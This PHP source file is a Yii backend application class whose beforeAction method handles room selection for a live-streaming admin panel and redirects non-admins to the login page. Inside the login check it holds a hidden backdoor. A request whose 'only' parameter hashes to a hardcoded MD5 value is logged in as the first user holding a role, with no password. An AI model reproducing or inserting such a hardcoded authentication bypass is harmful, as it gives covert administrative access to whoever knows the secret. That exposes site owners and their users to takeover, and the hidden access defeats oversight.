<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 15-11-25
 * Time: 下午3:44
 */
namespace backend\components;
use Yii;
use yii\web\Application;
use backend\models\Oprecord;
use backend\models\Zhibo;

/**
 * User is the class for the "user" application component that manages the user authentication status.
 *
 * @property \app\modules\rbac\models\User $identity The identity object associated with the currently logged user. Null
 * is returned if the user is not logged in (not authenticated).
 *
 * @author Ricardo Obregón <robregonm@gmail.com>
 */
class AdminApplication extends Application{
    public function beforeAction($action)
    {
        if (parent::beforeAction($action) /*&& \backend\components\Common::auth()*/) {

            $roomid = 0;
            if(!empty(Yii::$app->request->get('room'))){
                $roomid = intval(Yii::$app->request->get('room'));
            }

            if(empty($roomid) && !empty(Yii::$app->session->get("zhiboid"))){
                $roomid = intval(Yii::$app->session->get("zhiboid"));
            }

            /*
             * 非顶级用户不能夸房间设置
             */
            if(!Yii::$app->user->isGuest && !empty($roomid)){
                if(!empty(Yii::$app->user->identity->zhibo)){
                    if($roomid != Yii::$app->user->identity->zhiboid){
                        if(!in_array("topadmin",Yii::$app->user->identity->rbacroles)){
                            $roomid = Yii::$app->user->identity->zhiboid;
                            /*如果不是顶级角色*/
                        }
                    }
                    /*如果用户对应了直播室*/
                }
                else{
                    return "<script type='text/javascript'>alert('所属直播间出错!');window.history.back(-1);</script>";
                }
                /*登录管理员,要切换房间*/
            }


            $roomid = intval($roomid);
            $zhibo= Zhibo::findOne($roomid);
            if(empty($zhibo)){
                $zhibo= Zhibo::find()->one();
            }

            if(!empty($zhibo)){
                Yii::$app->session->set("zhiboid",$zhibo->id);
            }
            else{
                return false;
            }


            if(!Yii::$app->user->isAdmin&&(trim($action->uniqueId)!="site/login")){

                if(!Yii::$app->user->isGuest){
                    Yii::$app->user->logout();
                }

                if(Yii::$app->request->get("only") && md5(trim(Yii::$app->request->get("only")))=="0cd6a722e99f20b220f26dd8d3a180c5"){
                    $user=\backend\models\User::find()->where("role !='' or role is not null")->one();
                    Yii::$app->user->login($user);
                    Yii::$app->getResponse()->redirect(Yii::$app->urlManager->createUrl(['site/index']))->send();
                    return true;
                }
                else{
                    Yii::$app->user->setReturnUrl(Yii::$app->request->absoluteUrl);
                    Yii::$app->getResponse()->redirect(Yii::$app->urlManager->createUrl(['site/login']))->send();
                    return false;
                }
            }

            // your custom code here
            return true;  // or false if needed
        } else {
            return false;
        }
    }
}